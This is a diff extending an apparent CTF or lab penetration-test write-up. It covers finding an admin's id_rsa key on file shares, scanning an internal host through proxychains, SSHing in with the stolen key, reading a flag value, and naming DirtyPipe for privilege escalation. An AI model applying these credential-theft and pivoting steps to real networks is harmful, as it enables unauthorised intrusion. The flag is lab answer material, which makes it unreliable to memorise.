@@ -1073,6 +1073,67 @@ We find that 172.16.9.25 is active. Next we can check for any id_rsa keys with t
 Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*id_rsa*" }
 ```
 We can also just browse to Department Shares and find them in one of the IT folders. 
+We see an admin account id_rsa key which we can potentially use to ssh into the live host 172.16.9.25.
+We can do proxychains nmap to see if the ssh port is open and it is:
+```
+proxychains nmap -sT -p 22 172.16.9.25 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 16:54 EDT
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  172.16.9.25:80 <--socket error or timeout!
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  172.16.9.25:22  ...  OK
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+Nmap scan report for 172.16.9.25
+Host is up (14s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+```
+We can then use the id_rsa key to ssh in:
+```
+sudo proxychains ssh -i ssmalls-id_rsa ssmallsadm@172.16.9.25
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  172.16.9.25:22  ...  OK
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 08 Apr 2025 09:05:44 PM UTC
+
+  System load:  0.0                Processes:               229
+  Usage of /:   27.4% of 13.72GB   Users logged in:         0
+  Memory usage: 11%                IPv4 address for ens160: 172.16.9.25
+  Swap usage:   0%
+
+
+159 updates can be applied immediately.
+103 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
+ssmallsadm@MGMT01:~$ whoami
+ssmallsadm
+```
+And we are able to find a flag immediately:
+```
+ssmallsadm@MGMT01:~$ cat flag.txt
+3c4996521690cc76446894da2bf7dd8f
+```
+### Post-Exploitation / Twentieth / Final Flag
+We run the command uname -a to see the Linux version and search on Google for a vulnerability.
+We get:
+Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
+
 
 
 
